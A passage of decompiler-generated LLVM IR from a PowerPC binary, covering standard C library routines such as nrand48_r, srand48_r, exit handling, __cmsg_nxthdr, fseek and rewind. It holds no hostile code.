  %v0_100264a028 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100264a029 = add i32 %v0_100264a028, -1
  store i32 %v1_100264a029, i32* %ctr.global-to-local, align 4
  %v2_100264a030 = icmp eq i32 %v1_100264a029, 0
  br i1 %v2_100264a030, label %dec_label_pc_100264a4, label %dec_label_pc_10026490.dec_label_pc_10026490_crit_edge

dec_label_pc_10026490.dec_label_pc_10026490_crit_edge: ; preds = %dec_label_pc_10026490.lr.ph, %dec_label_pc_10026490.dec_label_pc_10026490_crit_edge
  %v1_1002649c31 = phi i32 [ %v1_1002649c, %dec_label_pc_10026490.dec_label_pc_10026490_crit_edge ], [ %v1_1002649c27, %dec_label_pc_10026490.lr.ph ]
  %v1_10026494.pre = load i32, i32* @r8, align 4
  %v0_10026498.pre = load i32, i32* @r10, align 4
  %v1_10026490 = mul i32 %v1_1002649c31, 4
  %v2_10026494 = add i32 %v1_10026490, %v1_10026494.pre
  store i32 %v2_10026494, i32* %r9.global-to-local, align 4
  %v2_10026498 = add i32 %v2_10026494, 132
  %v3_10026498 = inttoptr i32 %v2_10026498 to i32*
  store i32 %v0_10026498.pre, i32* %v3_10026498, align 4
  %v0_1002649c = load i32, i32* @r11, align 4
  %v1_1002649c = add i32 %v0_1002649c, -1
  store i32 %v1_1002649c, i32* @r11, align 4
  %v0_100264a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100264a0 = add i32 %v0_100264a0, -1
  store i32 %v1_100264a0, i32* %ctr.global-to-local, align 4
  %v2_100264a0 = icmp eq i32 %v1_100264a0, 0
  br i1 %v2_100264a0, label %dec_label_pc_100264a4, label %dec_label_pc_10026490.dec_label_pc_10026490_crit_edge

dec_label_pc_100264a4:                            ; preds = %dec_label_pc_10026490.dec_label_pc_10026490_crit_edge, %dec_label_pc_10026490.lr.ph
  store i32 268592316, i32* @lr, align 4
  %v4_100264b8 = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10026428

dec_label_pc_100264c0:                            ; preds = %dec_label_pc_10026448
  %v3_100264c0 = icmp eq i32 %v0_100264c0, 2
  br i1 %v3_100264c0, label %dec_label_pc_100264c8, label %dec_label_pc_100264d4

dec_label_pc_100264c8:                            ; preds = %dec_label_pc_100264c0
  store i32 3, i32* @global_var_10045274.1388, align 4
  br label %dec_label_pc_100264d4

dec_label_pc_100264d4:                            ; preds = %dec_label_pc_100264c0, %dec_label_pc_100264c8
  %v3_100264d4 = phi i32 [ %v0_100264c0, %dec_label_pc_100264c0 ], [ 3, %dec_label_pc_100264c8 ]
  %v1_100264dc = icmp ne i32 %v3_100264d4, 3
  call void @__pseudo_cond_branch(i1 %v1_100264dc, i32 268592368)
  store i32 4, i32* @global_var_10045274.1388, align 4
  %v1_100264ec = call i32 @__GI__exit(i32 127)
  ret i32 %v1_100264ec

; uselistorder directives
  uselistorder i32 %v1_100264a0, { 1, 0 }
  uselistorder i32 %v1_1002649c, { 1, 0 }
  uselistorder i32 %v1_100263e8, { 1, 0 }
  uselistorder i32 %v1_100263e4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 6, 2, 7, 5, 4, 3, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 9, 8, 4, 0, 1, 7, 6, 5, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 2, 1, 3, 10, 14, 12, 11, 0, 13, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 127, { 1, 5, 0, 2, 4, 6, 3 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 3, 1, 2, 0 }
  uselistorder i32 132, { 4, 0, 1, 2, 3 }
  uselistorder i32 140, { 3, 0, 1, 2 }
  uselistorder i32 ()* @pthread_mutex_unlock, { 9, 11, 10, 2, 1, 0, 8, 7, 6, 20, 19, 18, 17, 21, 5, 4, 22, 3, 16, 15, 14, 13, 12 }
  uselistorder i32* @global_var_10045274.1388, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 1, 5, 4, 3, 2, 11, 13, 14, 12, 15, 8, 7, 6, 0, 10, 9 }
  uselistorder i32 ()* @__sigaddset, { 0, 3, 2, 1, 4 }
  uselistorder i32 124, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100264d4, { 1, 0 }
  uselistorder label %dec_label_pc_10026490.dec_label_pc_10026490_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10026448, { 1, 0 }
  uselistorder label %dec_label_pc_10026410, { 1, 0 }
  uselistorder label %dec_label_pc_100263dc.dec_label_pc_100263dc_crit_edge, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %v2_10026500 = inttoptr i32 %arg2 to i32*
  %v3_10026500 = call i32 @nrand48_r(i32 %arg1, i32* %v2_10026500)
  ret i32 %v3_10026500
}

define i32 @nrand48_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v0_1002651c = call i32 @__drand48_iterate()
  %v1_10026520 = icmp slt i32 %v0_1002651c, 0
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v1_10026520, label %dec_label_pc_10026548, label %dec_label_pc_1002652c

dec_label_pc_1002652c:                            ; preds = %entry
  %v0_1002652c = load i32, i32* %r31.global-to-local, align 4
  %v1_1002652c = add i32 %v0_1002652c, 2
  %v2_1002652c = inttoptr i32 %v1_1002652c to i16*
  %v3_1002652c = load i16, i16* %v2_1002652c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10026534 = add i32 %v0_1002652c, 4
  %v2_10026534 = inttoptr i32 %v1_10026534 to i16*
  %v3_10026534 = load i16, i16* %v2_10026534, align 2
  %v4_10026534 = zext i16 %v3_10026534 to i32
  %div = udiv i16 %v3_1002652c, 2
  %v1_10026538 = zext i16 %div to i32
  %v1_1002653c = mul nuw i32 %v4_10026534, 32768
  %v2_10026540 = or i32 %v1_1002653c, %v1_10026538
  %v1_10026544 = load i32, i32* %r30.global-to-local, align 4
  %v2_10026544 = inttoptr i32 %v1_10026544 to i32*
  store i32 %v2_10026540, i32* %v2_10026544, align 4
  %v0_10026558.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10026548

dec_label_pc_10026548:                            ; preds = %entry, %dec_label_pc_1002652c
  %v0_10026558 = phi i32 [ -1, %entry ], [ %v0_10026558.pre, %dec_label_pc_1002652c ]
  ret i32 %v0_10026558

; uselistorder directives
  uselistorder label %dec_label_pc_10026548, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp1 = sext i16 %arg1 to i32
  %v5_10026560 = sdiv i32 %tmp1, 65536
  store i32 %v5_10026560, i32* %r9.global-to-local, align 4
  %v4_10026564 = add i32 %arg2, 14
  %v5_10026564 = inttoptr i32 %v4_10026564 to i16*
  store i16 1, i16* %v5_10026564, align 2
  store i32 -554958848, i32* %r10.global-to-local, align 4
  store i32 13070, i32* %r0.global-to-local, align 4
  %v0_10026570 = load i32, i32* %r9.global-to-local, align 4
  %v1_10026570 = trunc i32 %v0_10026570 to i16
  %v4_10026570 = add i32 %arg2, 4
  %v5_10026570 = inttoptr i32 %v4_10026570 to i16*
  store i16 %v1_10026570, i16* %v5_10026570, align 2
  %v5_10026574 = add i32 %arg2, 2
  %v6_10026574 = inttoptr i32 %v5_10026574 to i16*
  store i16 %arg1, i16* %v6_10026574, align 2
  store i32 5, i32* %r9.global-to-local, align 4
  %v0_1002657c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002657c = trunc i32 %v0_1002657c to i16
  store i16 %v1_1002657c, i16* %tmp, align 2
  %v0_10026580 = load i32, i32* %r10.global-to-local, align 4
  %v1_10026580 = or i32 %v0_10026580, 58989
  store i32 %v1_10026580, i32* %r10.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v0_1002658c = load i32, i32* %r9.global-to-local, align 4
  %v3_1002658c = add i32 %arg2, 16
  %v4_1002658c = inttoptr i32 %v3_1002658c to i32*
  store i32 %v0_1002658c, i32* %v4_1002658c, align 4
  %v0_10026590 = load i32, i32* %r10.global-to-local, align 4
  %v3_10026590 = add i32 %arg2, 20
  %v4_10026590 = inttoptr i32 %v3_10026590 to i32*
  store i32 %v0_10026590, i32* %v4_10026590, align 4
  %v0_10026594 = load i32, i32* %r0.global-to-local, align 4
  %v1_10026594 = trunc i32 %v0_10026594 to i16
  %v4_10026594 = add i32 %arg2, 12
  %v5_10026594 = inttoptr i32 %v4_10026594 to i16*
  store i16 %v1_10026594, i16* %v5_10026594, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268697600, i32* @r10, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_100266184 = load i32, i32* @global_var_10045278.1392, align 4
  %v3_1002661c7 = icmp eq i32 %v3_100266184, 0
  %v1_100266208 = add i32 %v3_100266184, -1
  %v3_1002662c10 = load i32, i32* @global_var_1004527c.1391, align 4
  br i1 %v3_1002661c7, label %dec_label_pc_1002662c, label %dec_label_pc_100265b4

dec_label_pc_100265b4:                            ; preds = %entry, %dec_label_pc_10026610.backedge
  %v3_1002662c13 = phi i32 [ %v3_1002662c, %dec_label_pc_10026610.backedge ], [ %v3_1002662c10, %entry ]
  %v1_1002662011 = phi i32 [ %v1_10026620, %dec_label_pc_10026610.backedge ], [ %v1_100266208, %entry ]
  %v1_1002662412.in = phi i32 [ %v1_10026620, %dec_label_pc_10026610.backedge ], [ %v1_100266208, %entry ]
  %v1_1002662412 = mul i32 %v1_1002662412.in, 16
  store i32 %v1_1002662011, i32* @global_var_10045278.1392, align 4
  %v2_100265bc = add i32 %v3_1002662c13, %v1_1002662412
  %v3_100265bc = inttoptr i32 %v2_100265bc to i32*
  %v4_100265bc = load i32, i32* %v3_100265bc, align 4
  %v3_100265c4 = icmp eq i32 %v4_100265bc, 2
  br i1 %v3_100265c4, label %dec_label_pc_100265d8, label %dec_label_pc_100265d0

dec_label_pc_100265d0:                            ; preds = %dec_label_pc_100265b4
  %v3_100265c8 = icmp eq i32 %v4_100265bc, 3
  br i1 %v3_100265c8, label %dec_label_pc_100265f8, label %dec_label_pc_10026610.backedge

dec_label_pc_100265d8:                            ; preds = %dec_label_pc_100265b4
  %v1_100265d8 = add i32 %v2_100265bc, 4
  %v2_100265d8 = inttoptr i32 %v1_100265d8 to i32*
  %v3_100265d8 = load i32, i32* %v2_100265d8, align 4
  %v3_100265e0 = icmp eq i32 %v3_100265d8, 0
  br i1 %v3_100265e0, label %dec_label_pc_10026610.backedge, label %dec_label_pc_100265e8

dec_label_pc_100265e8:                            ; preds = %dec_label_pc_100265d8
  call void @__pseudo_call(i32 %v3_100265d8)
  br label %dec_label_pc_10026610.backedge

dec_label_pc_100265f8:                            ; preds = %dec_label_pc_100265d0
  %v1_100265f8 = add i32 %v2_100265bc, 4
  %v2_100265f8 = inttoptr i32 %v1_100265f8 to i32*
  %v3_100265f8 = load i32, i32* %v2_100265f8, align 4
  %v3_100265fc = icmp eq i32 %v3_100265f8, 0
  br i1 %v3_100265fc, label %dec_label_pc_10026610.backedge, label %dec_label_pc_10026604

dec_label_pc_10026604:                            ; preds = %dec_label_pc_100265f8
  call void @__pseudo_call(i32 %v3_100265f8)
  br label %dec_label_pc_10026610.backedge

dec_label_pc_10026610.backedge:                   ; preds = %dec_label_pc_10026604, %dec_label_pc_100265e8, %dec_label_pc_100265d8, %dec_label_pc_100265f8, %dec_label_pc_100265d0
  store i32 268697600, i32* @r10, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_10026618 = load i32, i32* @global_var_10045278.1392, align 4
  %v3_1002661c = icmp eq i32 %v3_10026618, 0
  %v1_10026620 = add i32 %v3_10026618, -1
  %v3_1002662c = load i32, i32* @global_var_1004527c.1391, align 4
  br i1 %v3_1002661c, label %dec_label_pc_1002662c, label %dec_label_pc_100265b4

dec_label_pc_1002662c:                            ; preds = %dec_label_pc_10026610.backedge, %entry
  %v3_1002662c.lcssa = phi i32 [ %v3_1002662c10, %entry ], [ %v3_1002662c, %dec_label_pc_10026610.backedge ]
  store i32 %v3_1002662c.lcssa, i32* @r3, align 4
  store i32 268592692, i32* @lr, align 4
  %v0_10026630 = call i32 @free()
  ret i32 %v0_10026630

; uselistorder directives
  uselistorder i32 %v1_10026620, { 1, 0 }
  uselistorder i32 %v2_100265bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10026610.backedge, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_100265b4, { 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004501c.1252 to i32), i32* %r29.global-to-local, align 4
  %v2_10026664 = ptrtoint i32* %stack_var_-40 to i32
  %v4_10026670 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_1004501c.1252 to i32))
  store i32 268592764, i32* @lr, align 4
  %v1_10026678 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004501c.1252 to i32))
  %v3_10026680 = load i32, i32* @global_var_10045278.1392, align 4
  %v3_10026688 = load i32, i32* @global_var_10045280.1394, align 4
  %v1_10026690 = add i32 %v3_10026680, 1
  store i32 %v1_10026690, i32* @r9, align 4
  %v2_10026694 = icmp slt i32 %v3_10026688, %v1_10026690
  %v3_100266a4 = load i32, i32* @global_var_1004527c.1391, align 4
  br i1 %v2_10026694, label %dec_label_pc_100266a4, label %dec_label_pc_100266d4

dec_label_pc_100266a4:                            ; preds = %entry
  %v1_10026698 = mul i32 %v3_10026688, 16
  %v1_1002669c = add i32 %v1_10026698, 320
  store i32 268592812, i32* @lr, align 4
  %v2_100266a8 = call i32 @realloc(i32 %v3_100266a4, i32 %v1_1002669c)
  store i32 %v2_100266a8, i32* %r29.global-to-local, align 4
  %v3_100266ac = icmp eq i32 %v2_100266a8, 0
  br i1 %v3_100266ac, label %dec_label_pc_100266b4, label %dec_label_pc_100266c4

dec_label_pc_100266b4:                            ; preds = %dec_label_pc_100266a4
  %v0_100266b4 = call i32 @__errno_location()
  %v2_100266bc = inttoptr i32 %v0_100266b4 to i32*
  store i32 12, i32* %v2_100266bc, align 4
  br label %dec_label_pc_1002670c

dec_label_pc_100266c4:                            ; preds = %dec_label_pc_100266a4
  %v3_100266c4 = load i32, i32* @global_var_10045280.1394, align 4
  store i32 %v2_100266a8, i32* @global_var_1004527c.1391, align 4
  %v1_100266cc = add i32 %v3_100266c4, 20
  store i32 %v1_100266cc, i32* @global_var_10045280.1394, align 4
  %v3_100266dc.pre = load i32, i32* @global_var_10045278.1392, align 4
  br label %dec_label_pc_100266d4

dec_label_pc_100266d4:                            ; preds = %entry, %dec_label_pc_100266c4
  %v3_100266e4 = phi i32 [ %v2_100266a8, %dec_label_pc_100266c4 ], [ %v3_100266a4, %entry ]
  %v3_100266dc = phi i32 [ %v3_100266dc.pre, %dec_label_pc_100266c4 ], [ %v3_10026680, %entry ]
  store i32 268697600, i32* @r8, align 4
  %v1_100266f0 = add i32 %v3_100266dc, 1
  %v1_100266f4 = mul i32 %v3_100266dc, 16
  store i32 %v1_100266f4, i32* @r10, align 4
  store i32 %v1_100266f0, i32* @global_var_10045278.1392, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 26012), i32* @global_var_10045224.1253, align 4
  %v2_10026704 = add i32 %v1_100266f4, %v3_100266e4
  store i32 %v2_10026704, i32* %r29.global-to-local, align 4
  %v4_10026708 = inttoptr i32 %v2_10026704 to i32*
  store i32 1, i32* %v4_10026708, align 4
  br label %dec_label_pc_1002670c

dec_label_pc_1002670c:                            ; preds = %dec_label_pc_100266b4, %dec_label_pc_100266d4
  store i32 %v2_10026664, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268592920, i32* @lr, align 4
  %v0_10026714 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1002671c = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1002671c

; uselistorder directives
  uselistorder i32 %v1_100266f4, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_1004527c.1391, { 1, 2, 3, 0 }
  uselistorder i32* @global_var_10045278.1392, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1004501c.1252 to i32), { 0, 2, 4, 1, 3 }
  uselistorder label %dec_label_pc_1002670c, { 1, 0 }
  uselistorder label %dec_label_pc_100266d4, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10026730 = add i32 %arg1, 28
  %v2_10026730 = inttoptr i32 %v1_10026730 to i32*
  %v3_10026730 = load i32, i32* %v2_10026730, align 4
  store i32 %v3_10026730, i32* @global_var_10045284.1396, align 4
  %v1_10026740 = add i32 %arg1, 44
  %v2_10026740 = inttoptr i32 %v1_10026740 to i32*
  %v3_10026740 = load i32, i32* %v2_10026740, align 4
  store i32 %v3_10026740, i32* @global_var_10045288.1397, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1004528c.1284, align 4
  %v0_10026774 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10026774)
  store i32 12, i32* @r3, align 4
  %v0_1002677c = call i32 @__syscall_error()
  ret i32 %v0_1002677c

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 0, 1, 3, 2 }
  uselistorder i1 true, { 10, 11, 5, 7, 1, 9, 0, 2, 13, 6, 3, 8, 12, 4 }
  uselistorder i32* @global_var_1004528c.1284, { 1, 0, 2 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_10026780 = load i32, i32* @r4, align 4
  %v1_10026780 = inttoptr i32 %v0_10026780 to i32*
  %v2_10026780 = load i32, i32* %v1_10026780, align 4
  %v0_10026784 = load i32, i32* @r3, align 4
  store i32 %v0_10026784, i32* %r11.global-to-local, align 4
  %v1_10026788 = add i32 %v2_10026780, 3
  store i32 %v1_10026788, i32* %r0.global-to-local, align 4
  %v1_10026790 = call i32 @__asm_rlwinm(i32 %v1_10026788, i32 0, i32 0, i32 29)
  %v0_10026794 = load i32, i32* @r4, align 4
  %v2_10026794 = add i32 %v0_10026794, %v1_10026790
  store i32 %v2_10026794, i32* %r3.global-to-local, align 4
  %tmp1 = icmp ult i32 %v2_10026780, 12
  br i1 %tmp1, label %dec_label_pc_100267cc, label %dec_label_pc_100267a0

dec_label_pc_100267a0:                            ; preds = %entry
  %v1_10026798 = add i32 %v2_10026794, 12
  %v0_100267a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100267a0 = add i32 %v0_100267a0, 20
  %v2_100267a0 = inttoptr i32 %v1_100267a0 to i32*
  %v3_100267a0 = load i32, i32* %v2_100267a0, align 4
  store i32 %v3_100267a0, i32* %r0.global-to-local, align 4
  %v1_100267a4 = add i32 %v0_100267a0, 16
  %v2_100267a4 = inttoptr i32 %v1_100267a4 to i32*
  %v3_100267a4 = load i32, i32* %v2_100267a4, align 4
  %v2_100267a8 = add i32 %v3_100267a4, %v3_100267a0
  store i32 %v2_100267a8, i32* %r0.global-to-local, align 4
  %v3_100267ac = icmp ugt i32 %v1_10026798, %v2_100267a8
  br i1 %v3_100267ac, label %dec_label_pc_100267cc, label %dec_label_pc_100267b4

dec_label_pc_100267b4:                            ; preds = %dec_label_pc_100267a0
  %v3_100267b4 = inttoptr i32 %v2_10026794 to i32*
  %v4_100267b4 = load i32, i32* %v3_100267b4, align 4
  %v1_100267b8 = add i32 %v4_100267b4, 3
  %v1_100267bc = call i32 @__asm_rlwinm(i32 %v1_100267b8, i32 0, i32 0, i32 29)
  %v0_100267c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_100267c0 = add i32 %v0_100267c0, %v1_100267bc
  %v1_100267c4 = load i32, i32* %r0.global-to-local, align 4
  %v0_100267c8 = load i32, i32* @lr, align 4
  %tmp = icmp ule i32 %v2_100267c0, %v1_100267c4
  call void @__pseudo_cond_branch(i1 %tmp, i32 %v0_100267c8)
  br label %dec_label_pc_100267cc

dec_label_pc_100267cc:                            ; preds = %dec_label_pc_100267a0, %entry, %dec_label_pc_100267b4
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_100267cc, { 2, 0, 1 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_100267d4 = load i32, i32* @r5, align 4
  store i32 %v0_100267d4, i32* @r7, align 4
  %v0_100267d8 = load i32, i32* @r4, align 4
  %tmp = icmp slt i32 %v0_100267d8, 0
  %v1_100267dc = zext i1 %tmp to i32
  %v2_100267dc = ashr i32 %v0_100267d8, 31
  %v3_100267dc = and i32 %v2_100267dc, -2
  %v4_100267dc = or i32 %v3_100267dc, %v1_100267dc
  %v3_100267e0 = inttoptr i32 %v4_100267dc to i16*
  %v4_100267e0 = call i32 @__GI_fseeko64(i16* %v3_100267e0, i32 %v0_100267d8, i32 %v0_100267d4)
  ret i32 %v4_100267e0

; uselistorder directives
  uselistorder i32 %v0_100267d8, { 1, 2, 0 }
}

define i32 @__GI_rewind(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100267ec = call i32 @__asm_mfcr()
  %v2_100267fc = add i32 %v0_100267ec, 56
  store i32 %v2_100267fc, i32* %r30.global-to-local, align 4
  store i32 %v0_100267ec, i32* @r31, align 4
  %v2_10026810 = add i32 %v0_100267ec, 52
  %v3_10026810 = inttoptr i32 %v2_10026810 to i32*
  %v4_10026810 = load i32, i32* %v3_10026810, align 4
  %v2_10026814 = ptrtoint i32* %stack_var_-40 to i32
  %v3_10026818 = icmp eq i32 %v4_10026810, 0
  store i1 %v3_10026818, i1* @cr4_eq, align 1
  br i1 %v3_10026818, label %dec_label_pc_10026820, label %dec_label_pc_1002682c

dec_label_pc_10026820:                            ; preds = %entry
  %v4_10026820 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 %v2_100267fc)
  %v0_10026824 = load i32, i32* %r30.global-to-local, align 4
  store i32 268593196, i32* @lr, align 4
  %v1_10026828 = call i32 @pthread_mutex_lock(i32 %v0_10026824)
  %v0_1002682c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1002682c

dec_label_pc_1002682c:                            ; preds = %entry, %dec_label_pc_10026820
  %v0_1002682c = phi i32 [ %v0_100267ec, %entry ], [ %v0_1002682c.pre, %dec_label_pc_10026820 ]
  %v1_1002682c = inttoptr i32 %v0_1002682c to i16*
  %v2_1002682c = load i16, i16* %v1_1002682c, align 2
  %v3_1002682c = zext i16 %v2_1002682c to i32
  store i32 0, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v1_1002683c = call i32 @__asm_rlwinm(i32 %v3_1002682c, i32 0, i32 29, i32 27)
  %v2_1002683c = trunc i32 %v1_1002683c to i16
  %v3_10026840 = load i32, i32* @r31, align 4
  %v4_10026840 = inttoptr i32 %v3_10026840 to i16*
  store i16 %v2_1002683c, i16* %v4_10026840, align 2
  store i32 ptrtoint ([3 x i8]* @global_var_10026848.1398 to i32), i32* @lr, align 4
  %v0_10026844 = call i32 @__GI_fseek()
  store i32 %v2_10026814, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10026850 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_10026850, label %dec_label_pc_10026854, label %dec_label_pc_10026858

dec_label_pc_10026854:                            ; preds = %dec_label_pc_1002682c
  store i32 268593240, i32* @lr, align 4
  %v0_10026854 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_10026854, i32* @r3, align 4
  br label %dec_label_pc_10026858

dec_label_pc_10026858:                            ; preds = %dec_label_pc_1002682c, %dec_label_pc_10026854
  %v1_1002686c = call %0 @__asm_mtcrf(i32 8, i32 %v0_100267ec)
  %v0_10026870 = load i32, i32* @r3, align 4
  ret i32 %v0_10026870

; uselistorder directives
  uselistorder i32 %v0_100267ec, { 4, 0, 1, 2, 3 }
  uselistorder i32 ()* @__GI_fseek, { 1, 0 }
  uselistorder i32 27, { 25, 23, 24, 1, 2, 27, 26, 34, 35, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 37, 38, 33, 39, 28, 29, 40, 30, 31, 32, 0, 36, 41 }
  uselistorder i1* @cr4_eq, { 2, 3, 6, 4, 5, 0, 9, 7, 8, 1, 12, 10, 11 }
  uselistorder label %dec_label_pc_10026858, { 1, 0 }
  uselistorder label %dec_label_pc_1002682c, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1002690c = load i32, i32* @lr, align 4
  store i32 %v0_1002690c, i32* %r0.global-to-local, align 4
  %v0_10026910 = load i32, i32* @r7, align 4
  store i32 %v0_10026910, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10026910, 3
  br i1 %tmp9, label %dec_label_pc_10026944, label %dec_label_pc_10026930

dec_label_pc_10026930:                            ; preds = %entry
  %v0_10026930 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1002693c = inttoptr i32 %v0_10026930 to i32*
  store i32 22, i32* %v2_1002693c, align 4
  br label %dec_label_pc_10026a0c

dec_label_pc_10026944:                            ; preds = %entry
  %v2_10026944 = add i32 %tmp, 52
  %v3_10026944 = inttoptr i32 %v2_10026944 to i32*
  %v4_10026944 = load i32, i32* %v3_10026944, align 4
  store i32 %v4_10026944, i32* @r28, align 4
  %v3_10026948 = icmp eq i32 %v4_10026944, 0
  br i1 %v3_10026948, label %dec_label_pc_10026950, label %dec_label_pc_10026970

dec_label_pc_10026950:                            ; preds = %dec_label_pc_10026944
  %v2_10026950 = add i32 %tmp, 56
  store i32 %v2_10026950, i32* @r29, align 4
  %v4_10026964 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 268527832, i32 %v2_10026950)
  %v0_10026968 = load i32, i32* @r29, align 4
  store i32 268593520, i32* @lr, align 4
  %v1_1002696c = call i32 @pthread_mutex_lock(i32 %v0_10026968)
  %v0_10026970.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026970

dec_label_pc_10026970:                            ; preds = %dec_label_pc_10026944, %dec_label_pc_10026950
  %v0_1002697c = phi i32 [ %tmp, %dec_label_pc_10026944 ], [ %v0_10026970.pre, %dec_label_pc_10026950 ]
  %v1_10026970 = inttoptr i32 %v0_1002697c to i16*
  %v2_10026970 = load i16, i16* %v1_10026970, align 2
  %v3_10026970 = zext i16 %v2_10026970 to i32
  store i32 %v3_10026970, i32* %r0.global-to-local, align 4
  %v1_10026974 = and i32 %v3_10026970, 64
  store i32 %v1_10026974, i32* %r9.global-to-local, align 4
  %v3_10026974 = icmp eq i32 %v1_10026974, 0
  br i1 %v3_10026974, label %dec_label_pc_1002698c, label %dec_label_pc_1002697c

dec_label_pc_1002697c:                            ; preds = %dec_label_pc_10026970
  store i32 %v0_1002697c, i32* @r3, align 4
  store i32 268593540, i32* @lr, align 4
  %v0_10026980 = call i32 @__stdio_wcommit()
  %v3_10026984 = icmp eq i32 %v0_10026980, 0
  br i1 %v3_10026984, label %dec_label_pc_1002698c, label %dec_label_pc_100269f4

dec_label_pc_1002698c:                            ; preds = %dec_label_pc_1002697c, %dec_label_pc_10026970
  %v0_1002698c = load i32, i32* @r30, align 4
  %v3_1002698c = icmp eq i32 %v0_1002698c, 1
  br i1 %v3_1002698c, label %dec_label_pc_10026994, label %dec_label_pc_1002698c.dec_label_pc_100269a8_crit_edge

dec_label_pc_1002698c.dec_label_pc_100269a8_crit_edge: ; preds = %dec_label_pc_1002698c
  br label %dec_label_pc_100269a8

dec_label_pc_10026994:                            ; preds = %dec_label_pc_1002698c
  %v0_10026994 = load i32, i32* @r31, align 4
  %v1_10026994 = inttoptr i32 %v0_10026994 to i16*
  %v2_10026998 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268593568, i32* @lr, align 4
  %v4_1002699c = call i32 @__stdio_adjust_position(i16* %v1_10026994, i32 %v2_10026998)
  %v1_100269a0 = icmp slt i32 %v4_1002699c, 0
